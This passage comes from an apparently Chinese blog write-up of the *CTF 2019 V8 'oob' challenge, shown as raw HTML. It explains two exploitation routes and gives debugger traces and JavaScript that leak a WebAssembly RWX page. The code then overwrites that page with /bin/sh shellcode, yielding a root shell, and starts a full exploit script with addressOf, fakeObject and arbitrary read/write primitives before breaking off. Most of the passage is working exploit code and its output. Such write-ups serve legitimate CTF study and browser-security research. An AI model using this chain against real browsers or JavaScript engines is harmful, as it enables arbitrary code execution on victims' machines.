class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x1f8b3558fa60</span> ◂— <span class="number">0x1020304</span><span class="comment">//0x1f8b3558fa60处的值被修改为0x0000000001020304</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x1f8b3558fa68</span> —▸ <span class="number">0x1989b3c0c71</span> ◂— <span class="number">0x1989b3c08</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x1f8b3558fa70</span> —▸ <span class="number">0x1f8b3558fa39</span> ◂— <span class="number">0x1989b3c14</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x1f8b3558fa78</span> ◂— <span class="number">0x300000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x1f8b3558fa80</span> —▸ <span class="number">0x1989b3c0561</span> ◂— <span class="number">0x2000001989b3c01</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0x1f8b3558fa88</span> —▸ <span class="number">0x1f8b3558fa61</span> ◂— <span class="number">0x7100000000010203</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0x1f8b3558fa90</span> —▸ <span class="number">0x1989b3c13b9</span> ◂— <span class="number">0x1989b3c01</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0x1f8b3558fa98</span> ◂— <span class="number">0x2</span>    </span><br></pre></td></tr></table></figure><h2 id="6、利用思路归纳"><a href="#6、利用思路归纳" class="headerlink" title="6、利用思路归纳"></a>6、利用思路归纳</h2><p>题目的利用思路有两种，一种是通过常规的堆漏洞利用方式，另一种是js引擎漏洞特有的义中叫做wasm的利用方式</p><p>在传统堆漏洞的pwn中，利用过程如下（因为在我们的浏览器中，已经实现了任意地址读写的漏洞效果，所以这个传统的利用思路在v8中也同样适用）</p><blockquote><p>通过堆漏洞能够实现一个任意地址写的效果</p><p>结合程序功能和UAF漏洞泄露出一个libc地址</p><p>通过泄露的libc地址计算出free_hook、malloc_hook、system和one_gadget的内存地址</p><p>利用任意地址写将hook函数修改为System或one_gadget的地址，从而实现shell的执行</p></blockquote><p>另外在v8中还有一种被称为webassembly即wasm的技术。通俗来讲，v8可以直接执行其它高级语言生成的机器码，从而加快运行效率。存储wasm的内存页是RWX可读可写可执行的，因此我们还可以通过下面的思路执行我们的shellcode：</p><blockquote><p>利用webassembly构造一块RWX内存页</p><p>通过漏洞将shellcode覆写到原本属于webassembly机器码的内存页中</p><p>后续再调用webassembly函数接口时，实际上就触发了我们部署好的shellcode</p></blockquote><p>wasm详细见下面的文章，讲的很好：</p><p><a class="link"   href="https://www.jianshu.com/p/bff8aa23fe4d" >https://www.jianshu.com/p/bff8aa23fe4d<i class="fas fa-external-link-alt"></i></a></p><h2 id="7、WASM方式进行漏洞利用"><a href="#7、WASM方式进行漏洞利用" class="headerlink" title="7、WASM方式进行漏洞利用"></a>7、WASM方式进行漏洞利用</h2><h3 id="简单用法"><a href="#简单用法" class="headerlink" title="简单用法"></a>简单用法</h3><p>wasm即webassembly，可以让JavaScript直接执行高级语言生成的机器码。</p><p>在线编译网站：<a class="link"   href="https://wasdk.github.io/WasmFiddle/" >https://wasdk.github.io/WasmFiddle/<i class="fas fa-external-link-alt"></i></a></p><p>可以直接通过示例来进行，点击左下角选择Code Buffer，之后正上方build，之后正上方run，之后右下方就会显示出执行结果：</p><p><img src="/2021/04/21/starctf2019-oob/image-20210104145616327.png" alt="image-20210104145616327"></p><p>这样有种猜测，是不是可以直接写调用命令，直接转换为WASM码，js引擎直接执行，后来发现这种方式是不行的，报告脚本错误</p><p><img src="/2021/04/21/starctf2019-oob/image-20210104150202512.png" alt="image-20210104150202512"></p><h3 id="利用wasm执行shellcode"><a href="#利用wasm执行shellcode" class="headerlink" title="利用wasm执行shellcode"></a>利用wasm执行shellcode</h3><p>wasm的作用是将一段功能转换为机器码，实际上wasm是一段AST字节码，之后通过运行wasm这一段字节码将高级语言转换为机器码，也就是说，wasm的功能可以理解为编译功能，wasm的代码和它”编译“生成的机器码的位置是不一样的</p><p>所以我们有这样的一种方式：</p><p>1、首先通过wasm生成一段tmpcode</p><p>2、通过addressOf原语找到存放wasm的内存地址</p><p>3、通过任意地址写原语用shellcode替换原本的tmpcode</p><p>4、最后调用之前的tmpcode功能即可触发shellcode</p><p>寻找</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /root/browser_study/v8/v8/v8/out/x64.release/d8 --allow-natives-syntax ./poc.js</span><br><span class="line">...</span><br><span class="line">[*] leak wasm func addr: <span class="number">0x000005b5f06a1b60</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; job <span class="number">0x000005b5f06a1b61</span></span><br><span class="line"><span class="number">0x5b5f06a1b61</span>: [Function] in OldSpace</span><br><span class="line"> - map: <span class="number">0x02b1b4a04379</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x05b5f0682109</span> &lt;<span class="built_in">JSFunction</span> (sfi = <span class="number">0x146242243b29</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: <span class="number">0x05b5f06a1b29</span> &lt;SharedFunctionInfo <span class="number">0</span>&gt;</span><br><span class="line"> - name: <span class="number">0x129784b04ae1</span> &lt;String[#<span class="number">1</span>]: <span class="number">0</span>&gt;</span><br><span class="line"> - formal_parameter_count: <span class="number">0</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: <span class="number">0x05b5f0681869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x027534f82001</span> &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance <span class="number">0x5b5f06a1969</span></span><br><span class="line"> - WASM function index <span class="number">0</span></span><br><span class="line"> - properties: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x1462422404b9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#name: 0x146242240449 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#arguments: 0x146242240369 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#caller: 0x1462422403d9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback vector: <span class="keyword">not</span> available</span><br><span class="line">pwndbg&gt; job <span class="number">0x05b5f06a1b29</span></span><br><span class="line"><span class="number">0x5b5f06a1b29</span>: [SharedFunctionInfo] in OldSpace</span><br><span class="line"> - map: <span class="number">0x129784b009e1</span> &lt;Map[<span class="number">56</span>]&gt;</span><br><span class="line"> - name: <span class="number">0x129784b04ae1</span> &lt;String[#<span class="number">1</span>]: <span class="number">0</span>&gt;</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: <span class="number">144</span></span><br><span class="line"> - formal_parameter_count: <span class="number">0</span></span><br><span class="line"> - expected_nof_properties: <span class="number">0</span></span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: <span class="number">0x05b5f06a1b01</span> &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - <span class="built_in">code</span> (from data): <span class="number">0x027534f82001</span> &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - function token position: <span class="number">-1</span></span><br><span class="line"> - start position: <span class="number">-1</span></span><br><span class="line"> - end position: <span class="number">-1</span></span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: <span class="number">0x129784b00c61</span> &lt;ScopeInfo[<span class="number">0</span>]&gt;</span><br><span class="line"> - length: <span class="number">0</span></span><br><span class="line"> - feedback_metadata: <span class="number">0x129784b02a39</span>: [FeedbackMetadata]</span><br><span class="line"> - map: <span class="number">0x129784b01319</span> &lt;Map&gt;</span><br><span class="line"> - slot_count: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; job <span class="number">0x05b5f06a1b01</span></span><br><span class="line"><span class="number">0x5b5f06a1b01</span>: [WasmExportedFunctionData] in OldSpace</span><br><span class="line"> - map: <span class="number">0x129784b05879</span> &lt;Map[<span class="number">40</span>]&gt;</span><br><span class="line"> - wrapper_code: <span class="number">0x027534f82001</span> &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: <span class="number">0x05b5f06a1969</span> &lt;Instance map = <span class="number">0x2b1b4a09789</span>&gt;</span><br><span class="line"> - function_index: <span class="number">0</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x05b5f06a1969</span></span><br><span class="line"><span class="number">0x5b5f06a1969</span>: [WasmInstanceObject] in OldSpace</span><br><span class="line"> - map: <span class="number">0x02b1b4a09789</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x031ac750ac19</span> &lt;Object map = <span class="number">0x2b1b4a0ac79</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: <span class="number">0x031ac75101e1</span> &lt;Module map = <span class="number">0x2b1b4a091e9</span>&gt;</span><br><span class="line"> - exports_object: <span class="number">0x031ac7510451</span> &lt;Object map = <span class="number">0x2b1b4a0adb9</span>&gt;</span><br><span class="line"> - native_context: <span class="number">0x05b5f0681869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - memory_object: <span class="number">0x05b5f06a1a91</span> &lt;Memory map = <span class="number">0x2b1b4a0a189</span>&gt;</span><br><span class="line"> - table <span class="number">0</span>: <span class="number">0x031ac75103e9</span> &lt;Table map = <span class="number">0x2b1b4a09aa9</span>&gt;</span><br><span class="line"> - imported_function_refs: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - managed_native_allocations: <span class="number">0x031ac7510391</span> &lt;Foreign&gt;</span><br><span class="line"> - memory_start: <span class="number">0x7f9336540000</span></span><br><span class="line"> - memory_size: <span class="number">65536</span></span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: <span class="number">0x55977a6fa3f0</span></span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: <span class="number">0x55977a6f9fd0</span></span><br><span class="line"> - indirect_function_table_size: <span class="number">0</span></span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x05b5f06a1968</span>+<span class="number">0x88</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x5b5f06a19f0</span> —▸ <span class="number">0x20bf51557000</span> ◂— movabs r10, <span class="number">0x20bf51557260</span> <span class="comment">/* 0x20bf51557260ba49 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x5b5f06a19f8</span> —▸ <span class="number">0x31ac75101e1</span> ◂— <span class="number">0x71000002b1b4a091</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x5b5f06a1a00</span> —▸ <span class="number">0x31ac7510451</span> ◂— <span class="number">0x71000002b1b4a0ad</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x5b5f06a1a08</span> —▸ <span class="number">0x5b5f0681869</span> ◂— <span class="number">0x129784b00f</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x5b5f06a1a10</span> —▸ <span class="number">0x5b5f06a1a91</span> ◂— <span class="number">0x71000002b1b4a0a1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0x5b5f06a1a18</span> —▸ <span class="number">0x129784b004d1</span> ◂— <span class="number">0x129784b005</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x20bf51557000</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x20bf51557000</span>     <span class="number">0x20bf51558000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>       +<span class="number">0x0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据上面的思路，写出泄露RWX内存页起始地址的JS代码如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);<span class="comment">//这里面的偏移在不同版本的v8中可能不同，不过只要在调试的过程中按照Function--&gt;shared_info--&gt;WasmExportedFunctionData--&gt;instance的调用关系确定偏移，最后telescope查看instance的内存就好了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + hex(rwx_page_addr));</span><br></pre></td></tr></table></figure><p>gdb结果如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /root/browser_study/v8/v8/v8/out/x64.release/d8 --allow-natives-syntax ./poc.js</span><br><span class="line">[Thread debugging <span class="keyword">using</span> libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">[New Thread <span class="number">0x7ff37b27e700</span> (LWP <span class="number">2610828</span>)]</span><br><span class="line">[New Thread <span class="number">0x7ff37aa7d700</span> (LWP <span class="number">2610829</span>)]</span><br><span class="line">[New Thread <span class="number">0x7ff37a27c700</span> (LWP <span class="number">2610830</span>)]</span><br><span class="line">[*] leak wasm func addr: <span class="number">0x000033dad08a2018</span></span><br><span class="line">[*] leak from: <span class="number">0x000033dad08a2030</span>: <span class="number">0x000033dad08a1fe1</span></span><br><span class="line">[*] leak from: <span class="number">0x000033dad08a1fe8</span>: <span class="number">0x000033dad08a1fb9</span></span><br><span class="line">[*] leak from: <span class="number">0x000033dad08a1fc8</span>: <span class="number">0x000033dad08a1e21</span></span><br><span class="line">[*] leak from: <span class="number">0x000033dad08a1ea8</span>: <span class="number">0x00002c90fe47c000</span></span><br><span class="line">[*] leak rwx_page_addr: <span class="number">0x00002c90fe47c000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样我们成功的泄露出了rwx内存页的起始地址</p><p>后续只要利用任意地址写write64原语我们的shellcode写入这个rwx页，然后调用wasm函数接口即可触发我们的shellcode了，具体实现如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/* /bin/sh for linux x64</span><br><span class="line"> char shellcode[] = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f \x2f\x62\x69\x6e\x2f\x73\x68\x53 \x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;;</span><br><span class="line">*/</span><br><span class="line">var shellcode = [</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">var data_buf = new ArrayBuffer(24);</span><br><span class="line">var data_view = new DataView(data_buf);</span><br><span class="line">var buf_backing_store_addr = addressOf(data_buf) + 0x20n;</span><br><span class="line"></span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);  //这里写入之前泄露的rwx_page_addr地址</span><br><span class="line">data_view.setFloat64(0, i2f(shellcode[0]), true);</span><br><span class="line">data_view.setFloat64(8, i2f(shellcode[1]), true);</span><br><span class="line">data_view.setFloat64(16, i2f(shellcode[2]), true);</span><br><span class="line"></span><br><span class="line">f();</span><br></pre></td></tr></table></figure><p><img src="/2021/04/21/starctf2019-oob/image-20210104161032616.png" alt="image-20210104161032616"></p><p>最终运行结果如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/browser_study/v8/v8/v8/out/x64.release# ./d8 exp.js</span><br><span class="line">[*] leak wasm func addr: <span class="number">0x0000388ba6d624a0</span></span><br><span class="line">[*] leak from: <span class="number">0x0000388ba6d624b8</span>: <span class="number">0x0000388ba6d62469</span></span><br><span class="line">[*] leak from: <span class="number">0x0000388ba6d62470</span>: <span class="number">0x0000388ba6d62441</span></span><br><span class="line">[*] leak from: <span class="number">0x0000388ba6d62450</span>: <span class="number">0x0000388ba6d622a9</span></span><br><span class="line">[*] leak from: <span class="number">0x0000388ba6d62330</span>: <span class="number">0x00003a7d7595f000</span></span><br><span class="line">[*] leak rwx_page_addr: <span class="number">0x00003a7d7595f000</span></span><br><span class="line">[*] write to : <span class="number">0x000008913e091668</span>: <span class="number">0x00003a7d7595f000</span></span><br><span class="line"><span class="meta"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><h3 id="完整exp如下"><a href="#完整exp如下" class="headerlink" title="完整exp如下"></a>完整exp如下</h3><h4 id="x64如下"><a href="#x64如下" class="headerlink" title="x64如下"></a>x64如下</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型，以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将某个addr强制转换为object对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);</span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型，以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span 